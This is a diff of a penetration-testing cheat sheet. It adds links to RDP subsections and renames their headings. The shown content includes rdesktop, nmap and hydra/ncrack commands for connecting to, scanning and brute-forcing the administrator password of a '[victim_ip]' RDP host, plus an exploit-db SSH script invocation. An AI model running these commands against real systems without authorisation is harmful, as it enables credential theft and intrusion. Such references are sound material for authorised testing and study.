@@ -25,6 +25,9 @@
 - [NFS](#NFS)
 - [SSH](#SSH)
 - [RDP](#RDP)
+  - [Connect to RPD](connect_RDP)
+  - [nmap rdp scan](nmap_rdp_scan])
+  - [Bruteforce RDP credentials](#bruteforce_rdp_credentials)
 - [RPC](#RPC)
 - [SNMP](#SNMP)
 - [SMTP](#SMTP)
@@ -402,16 +405,18 @@ python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlis
 - https://github.com/g0tmi1k/debian-ssh
 --------------------------------------------------------------------------------------------------------------------------------------
 # RDP
+
+## connect_RDP
 ```
 rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
 ```
 
-### nmap scan with rdp nse scan
+## nmap_rdp_scan
 ```
 nmap -p 3389 --script rdp-ntlm-info [victim_ip]
 ```
 
-### bruteforce rdp credentials
+## bruteforce_rdp_credentials
 ```
 hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
 ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
